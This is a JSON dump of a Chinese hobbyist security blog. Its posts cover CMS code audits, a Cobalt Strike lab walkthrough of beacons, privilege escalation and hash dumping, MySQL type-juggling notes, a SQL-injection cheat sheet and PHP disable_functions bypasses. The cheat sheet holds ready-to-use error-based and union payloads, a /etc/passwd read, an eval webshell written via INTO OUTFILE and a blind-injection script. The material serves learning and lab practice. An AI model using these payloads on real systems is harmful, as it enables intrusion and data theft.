{"meta":{"title":"tkcharlotte's blog","subtitle":null,"description":null,"author":"tk","url":"https://boombao.net","root":"/"},"pages":[{"title":"404 Not Found","date":"2019-07-28T02:20:44.168Z","updated":"2019-07-28T02:20:44.168Z","comments":true,"path":"404.html","permalink":"https://boombao.net/404.html","excerpt":"","text":"404 Not Found **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"关于我","date":"2019-07-28T05:57:42.271Z","updated":"2019-07-28T05:57:42.271Z","comments":true,"path":"about/index.html","permalink":"https://boombao.net/about/index.html","excerpt":"","text":"我 刚踏入社会的新人 练习时长两年多的安全爱好者 坐标： TJ.China 本站 typecho vps + hexo + next主题 github + hexo + material-x主题 …欢迎各位师傅，想要友链的请在评论区留言 : )"},{"title":"所有分类","date":"2019-07-28T02:11:29.375Z","updated":"2019-07-28T02:11:29.375Z","comments":true,"path":"categories/index.html","permalink":"https://boombao.net/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-08-24T09:31:38.274Z","updated":"2019-08-24T09:31:38.274Z","comments":true,"path":"friends/index.html","permalink":"https://boombao.net/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2019-07-28T02:12:10.773Z","updated":"2019-07-28T02:12:10.773Z","comments":true,"path":"tags/index.html","permalink":"https://boombao.net/tags/index.html","excerpt":"","text":""},{"title":"","date":"2019-07-28T02:12:37.485Z","updated":"2019-07-28T02:12:37.485Z","comments":true,"path":"mylist/index.html","permalink":"https://boombao.net/mylist/index.html","excerpt":"","text":""}],"posts":[{"title":"CMS代码审计(二)","slug":"audit-2","date":"2019-09-09T10:58:55.000Z","updated":"2019-09-10T01:14:20.047Z","comments":true,"path":"2019/09/09/audit-2/","link":"","permalink":"https://boombao.net/2019/09/09/audit-2/","excerpt":"初步分析想找点小型的cms审计一下练练手，谷歌一搜，跳出来一个xiaocms，就决定是你了~","text":"初步分析想找点小型的cms审计一下练练手，谷歌一搜，跳出来一个xiaocms，就决定是你了~ 这套cms最新版发布时间是14年，应该是停止更新了。 MVC架构，看官网介绍还是用了PDO预编译… 注入基本是没戏了 从系统入口开始，include xiaocms.php,xiaocms.php定义了一些全局变量，路由解析规则，控制器加载规则等东西。没有a和c参数时默认访问index方法。对控制器访问做了一定的限制，过滤了斜杠/。 作者重写了get和post方法，对传入的参数使用htmlspecialchars过滤了&lt;&gt;&quot;等。 获取ip的函数也做了限制，哇难受的一批 太菜了，转战后台。 正文假设进入了后台，就要考虑怎么getshell，最平常的思路就是文件上传。看一下这套cms的上传逻辑。 upload.class.php中 跟进函数 看一下$limit_type是个啥，跟进去发现是个变量… 不应该哇，再一看，通过set_limit_type函数设置白名单，这… 全局搜索一下upload函数，看看调用情况。找来找去都在admin/uploadfile.php中。 通读该文件，各种上传方式实现，编辑器上传，直接上传等。 在编辑器上传和uploadify_upload两处调用了upload函数,只有后者才能控制type。 后边的判断是加水印的，无关痛痒。 本地构造一个表单手动上传。 后台也有模板管理的功能，一开始看后缀都是html就没多想，后来看其他师傅的分析才明白过来..模板也是要被包含进php文件的, 太菜了(⸝⸝⸝ᵒ̴̶̥́ ⌑ ᵒ̴̶̣̥̀⸝⸝⸝) 所以可以后台编辑模板，写入phpinfo,就能执行。分析一下原因 后台编辑模板url为http://127.0.0.1/xiaocms/admin/index.php?c=template&amp;a=edit&amp;dir=&amp;file=index.html template.php中的editAction方法 判断file的后缀是否合法，然后使用file_put_contents把file_content的值写入文件，注意一下，本来post方法使用了htmlspecialchars函数进行过滤，此处又进行了解码,所以写入的还是原来传入的内容。 此时php代码只是在html文件中，它是怎么被加载的呢？ 继续往下走，假设我们修改了index.html模板文件，访问index.php时会触发php代码，跟进indexAction函数，不传入任何参数默认执行下面这段代码 问题应该是出在display函数，跟进去看一下 view.class.php 34行 首先获取html文件的内容，然后获取缓存文件，如果html对应的缓存文件与源html都存在，就调用load_view_file函数，该函数对cms规定的一些标签进行替换，最后通过create_compile_file函数写入缓存文件，最后包含该缓存文件，导致任意php代码被执行。 总结审计时要白+黑，白盒+黑盒测试一起，关注一下底层的一些过滤函数以及sql处理 上传逻辑等，根据功能点进行代码分析，最重要的是有耐心吧=。= 这次看的还是不够仔细啊，后台还可以尝试配置文件写shell，但是会多一个单引号，导致代码不解析，因为存在var_export的原因，这一点在审计minicms时也遇见过。 up up!!!(ง •̀-•́)ง","categories":[{"name":"code","slug":"code","permalink":"https://boombao.net/categories/code/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://boombao.net/tags/代码审计/"}]},{"title":"初探cobaltstrike(一)","slug":"cobalt-strike-1","date":"2019-09-04T08:09:59.000Z","updated":"2019-09-04T08:18:41.561Z","comments":true,"path":"2019/09/04/cobalt-strike-1/","link":"","permalink":"https://boombao.net/2019/09/04/cobalt-strike-1/","excerpt":"趁着有时间，把不懂的学一学(๑•̀ㅂ•́)و✧.","text":"趁着有时间，把不懂的学一学(๑•̀ㅂ•́)و✧. 基础启动先启动一个服务端 ./teamserver ip password 启动客户端连接 ./cobaltstrike User随便输，Password是启动服务端时的密码。 模块介绍Cobalt Strike123456New Connection 创建一个新连接Perferences 修改一些字体信息啥的，也可以在TeamServers处删除登录凭证Visualization 显示的模式VPN interfaces vpn配置（未测试）Listensers 监听器，可以执行添加/编辑/移除监听等操作Script Manager 字面意思 脚本管理 脚本也是cs的一大杀器。 View12345678910Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本Credentials 显示所有已经获取的用户主机hashDownloads 显示下载的文件Event log 事件日志 记录团队 目标上线等记录Keystrokes 目标键盘记录Proxy Pivots 代理信息Screenshots 屏幕截图Script Console 加载自定义脚本Targets 显示所有主机Web log web服务日志 Attacks12345678910111213141516171819PackagesHTML Application 生成hta文件MS Office Macro 宏office文件Payload Generator 生成各种语言版本的payloadUSB/CD AutoPlay 利用自动播放运行的被控端文件Windows Dropper 捆绑器可将任意正常的文件Windows Executable payload生成可执行文件Windows Executable (S) 无状态------------------------------------------Web Drive-by Manage 开启的所有web服务Clone Site 克隆网站 Host File 提供Web以供下载某文件Scripted Web Delivery 为payload提供web服务以便于下载和执行Signed Applet Attack 启动一个Web服务以提供自签名Java Applet的运行环境Smart Applet Attack 自动检测Java版本并l利用已知的exploits绕过securitySystem Profiler 获取系统，Flash，浏览器版本等-------------------------------------------Spear Phish 鱼叉式网络钓鱼 基本操作首先，我们设置一个监听，Cobalt Strike-&gt;Listensers-&gt;Add ，cs提供了八种方式。 12345678windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_httpwindows/beacon_http/reverse_httpwindows/beacon_https/reverse_httpswindows/beacon_smb/bind_pipe 即 SMB Beaconwindows/foreign/reverse_httpwindows/foreign/reverse_httpswindows/foreign/reverse_tcp 开启以后，为了测试方便，我们直接生成一个马，传到靶机上。 Attacks-&gt;Windows Executable 生成一个64位木马，然后绑定到一开始创建的监听test1上。 靶机运行exe以后cs接收到一个Beacon(信标标志之类的意思)。类似于msf的meterpreter。 右键Interact,与beacon交互。输入help查阅能够执行的命令。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293beacon&gt; helpBeacon Commands=============== Command Description ------- ----------- browserpivot Setup a browser pivot session bypassuac Spawn a session in a high integrity process cancel Cancel a download that&apos;s in-progress cd Change directory checkin Call home and post data clear Clear beacon queue covertvpn Deploy Covert VPN client cp Copy a file dcsync Extract a password hash from a DC desktop View and interact with target&apos;s desktop dllinject Inject a Reflective DLL into a process dllload Load DLL into a process with LoadLibrary() download Download a file downloads Lists file downloads in progress drives List drives on target elevate Try to elevate privileges execute Execute a program on target (no output) execute-assembly Execute a local .NET program in-memory on target exit Terminate the beacon session getprivs Enable system privileges on current token getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu inject Spawn a session in a specific process jobkill Kill a long-running post-exploitation task jobs List long-running post-exploitation tasks kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Inject a keystroke logger into a process kill Kill a process link Connect to a Beacon peer over SMB logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode dns6 Use DNS AAAA as data channel (DNS beacon only) mode http Use HTTP as data channel mode smb Use SMB peer-to-peer communication mv Move a file net Network and host enumeration tool note Assign a note to this Beacon portscan Scan a network for open services powerpick Execute a command via Unmanaged PowerShell powershell Execute a command via powershell.exe powershell-import Import a powershell script ppid Set parent PID for spawned post-ex jobs ps Show process list psexec Use a service to spawn a session on a host psexec_psh Use PowerShell to spawn a session on a host psinject Execute PowerShell command in specific process pth Pass-the-hash using Mimikatz pwd Print current directory reg Query the registry rev2self Revert to original token rm Remove a file or folder rportfwd Setup a reverse port forward run Execute a program on target (returns output) runas Execute a program as another user runasadmin Execute a program in a high-integrity context runu Execute a program under another PID screenshot Take a screenshot setenv Set an environment variable shell Execute a command via cmd.exe shinject Inject shellcode into a process shspawn Spawn process and inject shellcode into it sleep Set beacon sleep time socks Start SOCKS4a server to relay traffic socks stop Stop SOCKS4a server spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh Use SSH to spawn an SSH session on a host ssh-key Use SSH to spawn an SSH session on a host steal_token Steal access token from a process timestomp Apply timestamps from one file to another unlink Disconnect from parent Beacon upload Upload a file wdigest Dump plaintext credentials with mimikatz winrm Use WinRM to spawn a session on a host wmi Use WMI to spawn a session on a host 场景内网环境网络为了测试方便，本地使用VMware Station模拟两层内网，机器配置有限，就开了三个虚拟机，一台xp，一台win7，一台Ubuntu14.04,一层内网有Ubuntu和win7，内网机器有一台xp，其中win7位跳板机，可以访问内网。 在Vmware中可以通过添加网卡，然后将该网卡设置为LAN网段模式，然后在机器中固定ip。 过程现在我们假设通过一些手段拿到了win7的权限，可以执行命令，上传文件，我们可以通过cs生成一个木马上传到win7上，然后服务端创建一个Listener，就可以得到一个Beacon。 Attacks-&gt;Windows Executable 然后绑定Lsitener，在靶机上执行该文件，等待主机上线。 可以看到我们已经得到一个Beacon，默认的sleep时间为60s，我们本地测试就直接sleep 0，节约时间。 内外网ip 主机名 连接时间等都显示的很清楚。 看一下主机ip，是否存在内网或者是域，判断一下网络拓扑。shell ipconfig 有两个网卡，初步判断存在内网. 靶机上线后有三种视图，第一种在复杂的情况下直观的展示网络拓扑是怎样的，第二种比较简洁，列表的形式展示，第三种站在目标的角度，表明我们可以进行怎样的操作。第一种最炫(zhuang)酷(bi)！ 靶机处右键Interact,得到一个交互式的Beacon，输入help查看帮助。常规操作，查看权限，权限不够提权，抓hash 右键Access-&gt;DumpHash 尝试导出hash，提示权限不够，尝试提权. cs内置了几种提权方式，针对一些版本低的主机(win7)，可以通过添加自定义脚本来增强cs的功能。 gayhub上有个项目，收集了很多的自定义脚本：https://github.com/harleyQu1nn/AggressorScripts 导入几个试一下，导入了AV_Query elevate EDR三个脚本，其中elevate新提供了五种提权的方式。 使用AV_Query 看一下安装了啥防护软件,因为是虚拟机，我啥也没装，只有自带的windows defender 使用ms14-058提升权限，在交互式Beacon中可以看到进度： 完成后得到system权限的Beacon. 导出Hash,导出完成后点击图标栏中的名片图标，很直观的看到提取出的用户凭证。 如果内置的payload提权不成功，可以试一下进程注入的手法. 右键-&gt;access-&gt;explore-&gt;process list-&gt;inject (选择一个高权限且稳定的进程) 继续横向渗透,看一下同网段中有没有其他主机。 可以使用msf与cs联动，使用Spawn将Beacon派生到msf。 首先在cs中创建一个forgin的Listener，同时在msf中使用handler监听相同端口 靶机右键Spawn,msf中得到一个meterpreter 然后使用nmap或者是其他模块扫描 也可以使用cs自带的portscan explore-&gt;portscan ，扫描完成后可以看到内网中存在的主机列表。 发现还存活一台ubuntu 主机，此处假装通过爆破得到密码账号(滑稽），Login-&gt;ssh登录。 查看权限，不是root权限，尝试提权，upload上传linux-suggester-2.pl，看一下内核漏洞，记得上传后要给执行权限。 直接使用脏牛提权。 上边提到还有一层处在内网的主机，可以通过cs提供的Sock代理带入。 右键-&gt;Pivoting-&gt;SOCKS server 可以在View-&gt;Proxy Pivots中看到正在运行的代理。 kali自带proxychains,修改配置为socks4 127.0.0.1 port ，将三方工具带入。（小声bb，我本地测试的时候发现不行…可能是我操作问题） 在msf中还可以直接输入setg Proxies socks4:team server IP:proxy port 将其带入内网。 输入setg ReverseAllowProxy true 保证收到回连的数据。 内网xp直接上ms08-067，得到meterpreter通过payload_inject模块转给cs。 详细的操作可以看[https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E5%8D%81%E5%85%AD%E8%8A%82%5BMSF%E4%B8%8ECS%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC%5D.md] ==! 自己测试的时候出了一些问题，暂时没解决，先放一边… 假设我们已经完成上述步骤… ，再看下这时候的拓扑 问题内网xp无法访问，自带的代理与其他的socks代理工具都试过了，无法带入内网，后来发现是环境问题，个人机器没有抓发功能，导致数据过不去==！也尝试了仅主机模式，木得行o(一︿一+)o…., 先挖个坑吧，以后来填坑~ 最后上述介绍的都是cs的一些基本语法以及使用手段，后续可能会更新cs一些进阶用法，文章有不足或者任何错误，请各位大佬不吝赐教。感谢大佬们对cs的各种总结。╰(°▽°)╯ 参考链接https://rcoil.me/2018/04/Cobalt%20Strike学习 https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg https://blog.51cto.com/life2death/1618744 https://mp.weixin.qq.com/s/tqOv6p9NhKpo6Isz5jBuKw https://xz.aliyun.com/t/4191 https://wbglil.gitbooks.io/cobalt-strike/ https://github.com/aleenzz/Cobalt_Strike_wiki","categories":[{"name":"安全工具","slug":"安全工具","permalink":"https://boombao.net/categories/安全工具/"}],"tags":[{"name":"cobalt_strike","slug":"cobalt-strike","permalink":"https://boombao.net/tags/cobalt-strike/"},{"name":"tools","slug":"tools","permalink":"https://boombao.net/tags/tools/"},{"name":"安全","slug":"安全","permalink":"https://boombao.net/tags/安全/"}]},{"title":"CMS代码审计(一)","slug":"audit-1","date":"2019-09-01T02:16:55.000Z","updated":"2019-09-09T11:06:12.013Z","comments":true,"path":"2019/09/01/audit-1/","link":"","permalink":"https://boombao.net/2019/09/01/audit-1/","excerpt":"九月第一天，加油哇( •̀_•́ ) 记录一下代码审计的分析流程。","text":"九月第一天，加油哇( •̀_•́ ) 记录一下代码审计的分析流程。 1.系统重装漏洞利用条件 安装完成后未删除install.php文件。 漏洞分析定位到install.php，第6行位置 判断了是否存在install.lock文件，然后没有下文了。。。可能是开发失误。 漏洞复现安装完成 然后访问install.php 可以重装 2.后台xss(滑稽) 3.sql语句暴露 4.后台sql注入(鸡肋)漏洞复现访问url: http://127.0.0.1/uqcms/index.php/admin/ad/save post提交数据 alias=1#&amp;id=1 and updatexml(1,concat(0x7e,(select/**/user()),0x7e),1)#&amp;name=2&amp;px=0 漏洞分析admin/ad_class.php 第62行 通过P函数获取id的值，跟进P函数 因为传入的是false,去掉空格后直接返回，没有任何过滤。 5. 前台sql注入利用条件需要注册一个会员账号， 在修改收货地址处抓包，修改id参数，id参数未过滤，可报错注入，得到数据。 漏洞复现 漏洞分析home/address.class.php 文件，第35行位置 通过P函数获取后直接传入sql语句进行查询。 sql注入在这套cms里应该是不少…，以上只是举个例子，开发者把希望寄托在了360_safe.php提供的过滤规则上… ，虽然过滤大部分，但是没有过滤报错函数，POST方式没有过滤单引号。 6. 文件上传本地上传正常图片也不行，没进一步测试，附上先知社区大佬分析 https://xz.aliyun.com/t/6075 最后代码审计的能力太弱，希望自己能坚持下去，写成一个系列文章吧！","categories":[{"name":"code","slug":"code","permalink":"https://boombao.net/categories/code/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://boombao.net/tags/代码审计/"}]},{"title":"mysql隐式类型转换及其安全问题","slug":"fasle-mysql-injection","date":"2019-08-25T08:07:46.000Z","updated":"2019-08-25T08:09:14.239Z","comments":true,"path":"2019/08/25/fasle-mysql-injection/","link":"","permalink":"https://boombao.net/2019/08/25/fasle-mysql-injection/","excerpt":"测试时发现的一点小问题。","text":"测试时发现的一点小问题。 所谓的隐式类型转换，就是在不使用转换函数的情况下，默认转换了类型，比方说定义一个varchar变量id，传入了一个非预期类型的值，就会转换类型然后带入语句查询。说到底是忽略了不同数据类型之间是否兼容。 隐式类型转换有时会导致无法使用索引的风险，尤其是在高并发的情况下，不走索引就会全盘搜索，进行N多次I/O操作，占用很多资源而且浪费时间。 规则看一下转换规则： mysql官方文档 翻译过来的规则如下(半机翻)： 如果是一个或两个参数NULL，则比较的结果是NULL，除了NULL-safe &lt;=&gt; 等式比较运算符。因为NULL &lt;=&gt; NULL，结果是真的。无需转换。 如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。 如果两个参数都是整数，则将它们作为整数进行比较。 如果不与数字进行比较，十六进制值将被视为二进制字符串。 如果其中一个参数是TIMESTAMP 或DATETIME列而另一个参数是常量，则在执行比较之前将常量转换为时间戳。 有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较. 所有其他情况下，两个参数都会被转换为浮点数再进行比较. 测试实例test_table表中有username字段，varchar类型 正常情况下： 当我们输入0时， 会返回全部的数据，这是为什么？ 看上边的规则，最后一条，其他情况下，会转换成浮点数进行比较，字符串转浮点数会失败，就像php弱类型一样，mysql有没有类似的机制呢？尝试一下 1234567891011121314151617181920212223mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,1=&apos;2aaa&apos;,1=&apos;123aaa&apos;,1=1.0;+---------+----------+----------+------------+-------+| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 1=&apos;2aaa&apos; | 1=&apos;123aaa&apos; | 1=1.0 |+---------+----------+----------+------------+-------+| 0 | 1 | 0 | 0 | 1 |+---------+----------+----------+------------+-------+1 row in set, 4 warnings (0.00 sec)mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,2=&apos;2aaa&apos;,123=&apos;123aaa&apos;,1=1.0;+---------+----------+----------+--------------+-------+| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 2=&apos;2aaa&apos; | 123=&apos;123aaa&apos; | 1=1.0 |+---------+----------+----------+--------------+-------+| 0 | 1 | 1 | 1 | 1 |+---------+----------+----------+--------------+-------+1 row in set, 4 warnings (0.00 sec)mysql&gt; select 2 = &apos;a2&apos;;+----------+| 2 = &apos;a2&apos; |+----------+| 0 |+----------+1 row in set, 1 warning (0.00 sec) 从上边可以看出，字符串转成浮点数时会失败，如果字符串开头为数字，会在字母处截断，只取数字作为转换后的结果，所以username=0时会返回所有的结果，因为插入的数据都不是以数字开头的，转换时都会转成0，0=0，满足条件所以输出。 sql注入中的利用查了查资料，有大佬已经总结过了，陕西省网络安全大赛中出过一道这样的题目，详情可以看这里 参考链接https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html https://www.anquanke.com/post/id/86021 https://www.cnblogs.com/rollenholt/p/5442825.html","categories":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/categories/安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://boombao.net/tags/sql注入/"}]},{"title":"mysql注入备忘录(不断更新...)","slug":"mysql-injection-guide","date":"2019-08-22T06:03:39.000Z","updated":"2019-08-24T09:52:23.354Z","comments":true,"path":"2019/08/22/mysql-injection-guide/","link":"","permalink":"https://boombao.net/2019/08/22/mysql-injection-guide/","excerpt":"记录一下mysql手工注入语句，随拿随用。","text":"记录一下mysql手工注入语句，随拿随用。 常用函数查看版本 version() @@version //@@是系统变量 查看数据库 database() schema() 查看用户 user() current_user() system_user() 查看路径 select @@basedir 字符串相关 length() concat() //连接字符串 concat_ws(flag,s1,s2...) //同concat函数，每个字符要加上flag left(s,n) //返回s开始的最左边n个字符 right(s,n) //返回s开始的最右边的n个字符 repeat(s,n) //重复字符串s n次 substring(s,n,len) //获取字符串s从n开始长度为len的字符串 mid(s,n,len) //同上sub ascii(s) // 获取s的ascii值 group_concat() //连接字符串 条件判断if(expr,v1,v2) // 如果表达式成立，执行v1，否则执行v2 case when then 12345case expr when case1 then 1 when case2 then 2 else 3end case 注入方式 有回显的普通注入 报错注入(有回显) 头注入(X-Forwarded-For/UA头/cookie注入/...) insert注入 update注入 // 一般为报错注入 delete 注入 宽字节注入 盲注 布尔盲注 根据返回结果的差异来判断 时间盲注 根据是否延时来判断条件是否成立 二次注入 insert + select类型 update + select类型 … order by注入 注入点判断 字符型 12345id =1&apos; and &apos;1&apos;=&apos;1 #id =1&apos; and &apos;1&apos;=&apos;2 #id =1&apos; or &apos;1&apos;=&apos;1 #id =1&apos; or &apos;1&apos;=&apos;2 # &apos; &quot; &apos;) &quot;) //常见闭合方式 数字型 1234id = 1 and 1 =1 #id = 2 and 1= 2 #id = 1 or 1 = 1 #id = 2 or 1 = 2 # 注入语句有回显普通手工注入1234567891011121314id = 1 order by 3# // 条件为真，才能进行order by 查询id = -1 union select 1,2,3 # //前面条件为假，而且前后查询列数要相等SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA #SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database_name #SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=table_name # SELECT GROUP_CONCAT(column_1,column_2) FROM database_name.table_name #SELECT load_file(&apos;/etc/passwd&apos;)SELECT &apos;&lt;?php @eval($_POST[1]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;;show variables like &apos;%secure%&apos;; // 查看权限secure_file_priv= 可以读取目录secure_file_priv=NULL 不能读取secure_file_priv=C:\\ 只能读取C盘 报错注入updatexml(长度限制 32位)12345id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1))id=1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e),1))id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e),1)) id=1 and (updatexml(1,concat(0x7e,(select group_concat(password) from user),0x7e),1)) floor1?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) exp1exp(~(select * from(select group_concat(table_name) from information_schema.tables where !(table_schema &lt;&gt; database()))a)) or &apos; extractvaluel(长度限制 32位)12345id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e)))id=1 and (extractvalue(1,concat(0x7e,(select group_concat(password) from user),0x7e))) 盲注BENCHMARK(100000,MD5(1)) or sleep(5) 附上一个半成品吧，根据情况定制payload。 12345678910111213141516171819202122232425262728293031323334import requestsimport stringimport timeimport base64result = &apos;&apos;flag=the symbol of successful_dataurl = &quot;http:/xxx.com/index.php&quot;request = requests.session()prox = &#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;header=&#123;&quot;Host&quot;: &quot;test.dns.outnet&quot;,&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot;,&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;&#125;data=&#123; &quot;username&quot;:&quot;admin&quot;&#125;for i in range(1,50): for j in range(23,126): payload = &quot; &apos; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=the_name_of_table),&#123;0&#125;,1))=&#123;1&#125; # &quot;.format(i,j) #payload = &quot; &apos; or ascii(substr((select a from b),&#123;0&#125;,1))=&#123;1&#125; # &quot;.format(i,j) response = request.post(url=url,data=data,proxies=prox) time.sleep(1) if flag in response.text: result += chr(j) print(t) break DNSlog无回显注入没实践过，先记一下。 https://www.cnblogs.com/afanti/p/8047530.html 绕过方式过滤空格1234/**/ /*!*/union/**/select/*！union*/select 过滤关键字双写或者大小绕过 e.g: Uniunionon SeleSElectct 过滤逗号使用join函数代替 12select 1,2,3select (select 1)a join (select 2)b join (select 3)c 过滤单引号使用十六进制编码 正则匹配最大次数限制绕某些WAF时有奇效 https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html 杂七杂八查询字段名为关键字时需要使用反引号转义 数据库数据可能存在宽字节，需要转成十六进制再转成十进制。 …. 推荐破哥总结的注入笔记，破哥出品，必定精品~ https://p0sec.net/index.php/archives/117/","categories":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/categories/安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://boombao.net/tags/sql注入/"},{"name":"web安全","slug":"web安全","permalink":"https://boombao.net/tags/web安全/"}]},{"title":"一个shell引发的思考","slug":"shell-analy","date":"2019-08-18T03:33:52.000Z","updated":"2019-08-24T09:53:48.699Z","comments":true,"path":"2019/08/18/shell-analy/","link":"","permalink":"https://boombao.net/2019/08/18/shell-analy/","excerpt":"起因最近在做内部靶场平台题目，其中一道题为爆破一句话木马，拿到key的值。","text":"起因最近在做内部靶场平台题目，其中一道题为爆破一句话木马，拿到key的值。 经过木马密码可以通过burp爆破得到 祭出菜刀，连上一句话，发现权限被限制的很死，基本关于文件操作以及命令执行的函数都被禁用了.. 但是没有禁用file_get_contents函数，所以可以直接读取文件获得key。 如果在实际中遇到这种环境，函数被禁，怎么绕过disable_function？ 绕过姿势，一般有这么几种： 寻找未被禁用的函数 系统组件绕过 通过LD_PRELOAD绕过 mod-cgi 绕过 执行自定义语句(自己实现函数功能，通过webshell执行) 第一种 敏感函数整理一下经常用的各类函数，方便查找。 php中读取文件可以使用以下函数： 1234567readfilefreadfile_get_contentsvar_dump(file(file_name)) // file函数返回值位数组show_sourcehightlight_file...... 在php中可以执行命令函数有： 1system,exec,shell_exec,passthru，pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link 列目录函数： 1234567opendirscandirglob(&apos;*&apos;) $path = dirname(__FILE__);$result = glob($path.&apos;/*.php&apos;);print_r($result);... 第二种 三方组件利用系统存在的组件漏洞执行命令，扩大战果。 Bash漏洞导致命令执行 ImageMagic绕过 imagecreatefromgd2 sendmail 第三种 LD_PRELOAD使用LD_PRELOAD 程序执行时要在动态链接库.so中寻找函数位置，这种绕过方式就是让程序去执行自定义的动态链接库，类似于mysql下的udf提权或者redis主从复制RCE方式。 LD_PRELOAD这个全局变量指定动态链接库文件，会在程序运行之前加载。 1export LD_PRELOAD = XXX/xx.so 如果可以上传文件，我们可以通过上传一个恶意的.so库文件，然后加载该文件。最后绕过php层面执行命令函数。 推荐一个复现环境： https://github.com/obolu/Bypass_Disable_functions 第四种 mod_cgi+.htaccess在启用mod_cgi的apache服务器中，必须允许.htaccess以及有可写权限，要求有点苛刻。 在apache配置中有Options以及Addhandler指令，前者用来控制目录选项，比方说是否允许目录遍历，是否允许访问等，后者用来指定特定后缀名的文件所对应的处理方式，在解析漏洞中就有这样的用法，上传带少见后缀的恶意文件，修改.htaccess文件达到执行代码的目的。 这种绕过方式就是通过将要执行的程序写入带有特定拓展名的文件内，修改.htaccess文件，将恶意文件交给cgi处理。 具体的原理可以查阅 https://www.cnblogs.com/hookjoy/p/8988862.html 第五种 自定义语句通过编写php代码，用php最基础的底层函数实现一些被禁用的函数。 在本题目中，常见的列目录函数被禁用，包括readdir，opendir等函数，可以使用自定义语句列目录，也可以使用scandir函数。 想到可以读其他路径文件，说不定可以读到一些服务器的敏感信息啥的，看一下phpinfo中的open_basedir配置，限定了访问目录，只能访该题目所在目录。 查阅资料后发现，可以通过glob伪协议绕过限制，读取栏目。 123456$path = dirname(__FILE__);$result = glob($path.&apos;/*.php&apos;);print_r($result);//简化版$a = &quot;glob:///*&quot;;print_r(scandir($a)); 可以看到读到了根目录，但是没有足够权限读取/root/下的文件。需要借助其他的方式提升权限。 最后发现该靶机是一台虚拟主机之类的单独空间，没有其他题目的key，== ！ 姜还是老的辣啊2333 最后附上l3m0n大佬的github链接，里边记录了各种绕过姿势 https://github.com/l3m0n/Bypass_Disable_functions_Shell 参考链接https://www.anquanke.com/post/id/175403 https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html","categories":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/categories/安全/"}],"tags":[{"name":"webshell","slug":"webshell","permalink":"https://boombao.net/tags/webshell/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://boombao.net/tags/渗透测试/"}]}]}